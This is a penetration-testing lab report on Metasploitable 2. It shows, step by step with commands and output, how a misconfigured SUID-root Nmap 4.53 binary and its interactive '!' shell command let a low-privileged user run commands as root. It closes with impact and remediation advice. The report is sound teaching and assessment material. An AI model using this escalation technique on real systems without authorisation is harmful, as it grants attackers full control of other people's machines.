# Penetration Testing Report

## Privilege Escalation via SUID-Enabled Nmap

### 1. Finding Overview

**Finding:** SUID-enabled Nmap allows local privilege escalation
**Target:** Metasploitable 2
**Severity:** Critical
**Category:** Local Privilege Escalation / Misconfigured SUID Binary
**Affected Binary:** `/usr/bin/nmap`
**Nmap Version:** 4.53

### 2. Executive Summary

During the assessment of the Metasploitable 2 machine, a privilege-escalation vulnerability was identified involving the Nmap binary.

The `/usr/bin/nmap` executable was configured with the **SUID permission** and owned by `root`. This causes Nmap to execute with the privileges of its owner rather than the privileges of the user launching it.

The installed Nmap version, 4.53, also provides an **interactive mode** that allows shell commands to be executed using the `!` command.

By combining these two conditions, a low-privileged user (`msfadmin`) was able to execute a command with root privileges and obtain a root-level shell context.

### 3. Attack Path

```text
msfadmin
   |
   | Enumerate SUID binaries
   v
/usr/bin/nmap
   |
   | SUID + root ownership
   v
Nmap runs with root privileges
   |
   | Interactive mode
   v
! whoami
   |
   v
root
```

---

# 4. Detailed Exploitation Process

## Step 1 — Obtain a Low-Privileged Shell

SSH was used to connect to the Metasploitable 2 machine as the normal user:

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.251.103
```

The legacy SSH options were required because the old SSH server on Metasploitable 2 only supports older cryptographic algorithms.

After authentication:

```bash
whoami
```

Result:

```text
msfadmin
```

This confirmed that we initially had a **non-root user account**.

---

## Step 2 — Enumerate SUID Binaries

The following command was used to search the filesystem for SUID-enabled files:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the results was:

```text
/usr/bin/nmap
```

This was interesting because Nmap is not normally expected to require SUID root privileges.

---

## Step 3 — Verify Nmap Permissions

The permissions were checked with:

```bash
ls -l /usr/bin/nmap
```

Output:

```text
-rwsr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap
```

The important portion is:

```text
-rwsr-xr-x
```

The `s` in the owner's permission section indicates that the **SUID bit is enabled**.

The ownership was:

```text
root root
```

Therefore:

```text
Owner = root
SUID = enabled
```

This means Nmap can execute with the privileges of `root`.

---

## Step 4 — Identify the Nmap Version

The installed version was checked:

```bash
nmap --version
```

Result:

```text
Nmap version 4.53
```

This is an extremely old version of Nmap.

The combination of an old Nmap version and SUID configuration warranted further investigation.

---

## Step 5 — Check Nmap Interactive Mode

Nmap was started in interactive mode:

```bash
nmap --interactive
```

This produced:

```text
Welcome to Interactive Mode -- press h <enter> for help
nmap>
```

The help menu was then examined:

```text
h
```

One particularly important option was:

```text
! <command> -- runs shell command given in the foreground
```

This showed that Nmap's interactive mode could execute operating-system shell commands.

---

## Step 6 — Test Command Execution

The following command was entered inside the Nmap interactive prompt:

```text
! whoami
```

The result included:

```text
root
```

Although the old Nmap version also displayed:

```text
system() execution of command failed
```

the important security result was that the command execution returned:

```text
root
```

This demonstrated that the command was executing with **root privileges**.

---

# 5. Vulnerability Explanation

The vulnerability was not simply:

> "Nmap is old."

The actual problem was the combination of:

1. Nmap was installed with **SUID**
2. The binary was owned by **root**
3. The installed Nmap version provided **interactive shell-command execution**
4. A normal local user could execute the binary

This created the following privilege-escalation path:

```text
Low-privileged user
       ↓
SUID Nmap
       ↓
Nmap executes as root
       ↓
Interactive shell command
       ↓
Command executes as root
```

---

# 6. Impact

Successful exploitation allows a local user to execute commands with root-level privileges.

Root is the highest-privileged account on a traditional Linux system.

An attacker with root privileges could potentially:

* Read sensitive files
* Modify system configuration
* Create or modify user accounts
* Access other users' data
* Install malicious software
* Disable security controls
* Establish persistence
* Completely compromise the operating system

Therefore, the issue should be considered **critical** in a real environment.

---

# 7. Evidence

### SUID enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

Relevant result:

```text
/usr/bin/nmap
```

### File permissions

```bash
ls -l /usr/bin/nmap
```

Result:

```text
-rwsr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap
```

### Version

```bash
nmap --version
```

Result:

```text
Nmap version 4.53
```

### Privilege verification

Inside Nmap interactive mode:

```text
! whoami
```

Result:

```text
root
```

This provided direct evidence that the SUID Nmap binary could be abused to execute commands with root privileges.

---

# 8. Remediation

### Recommended actions

**1. Remove unnecessary SUID permission**

If Nmap does not require SUID privileges:

```bash
chmod u-s /usr/bin/nmap
```

This removes the SUID bit.

**2. Upgrade Nmap**

Replace the obsolete Nmap 4.53 installation with a currently supported version.

**3. Apply least privilege**

Executables should not have SUID root permissions unless there is a legitimate operational requirement.

**4. Audit other SUID binaries**

Administrators should regularly review SUID-enabled files and remove unnecessary SUID permissions.

Example:

```bash
find / -perm -4000 -type f 2>/dev/null
```

---

# 9. Security Assessment Conclusion

The Metasploitable 2 system was successfully compromised from a low-privileged `msfadmin` account to a root-level context through a misconfigured SUID Nmap binary.

The successful attack required no exploitation of a remote network service after obtaining local access. Instead, privilege escalation was achieved by abusing excessive privileges assigned to an outdated executable.

This demonstrates why security assessments should not stop after obtaining a normal user account. Local privilege enumeration can reveal additional vulnerabilities that allow complete system compromise.

### Final attack chain

```text
Initial Access
      ↓
msfadmin SSH account
      ↓
SUID Enumeration
      ↓
/usr/bin/nmap discovered
      ↓
SUID + root ownership confirmed
      ↓
Nmap 4.53 identified
      ↓
Interactive mode discovered
      ↓
! whoami
      ↓
ROOT
```

**Result: Successful Local Privilege Escalation**
